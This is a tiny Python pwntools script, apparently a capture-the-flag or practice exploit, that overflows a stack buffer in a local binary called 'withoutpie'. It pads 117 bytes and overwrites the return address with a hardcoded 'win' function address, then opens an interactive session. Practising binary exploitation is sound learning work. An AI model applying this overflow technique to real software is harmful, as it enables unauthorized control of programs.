# coding: utf-8
from pwn import *
p = process("./withoutpie")
p.recv()
winAddr = 0x08049182
payload = b"A"*117 + p32(winAddr)
p.sendline(payload)
p.interactive()
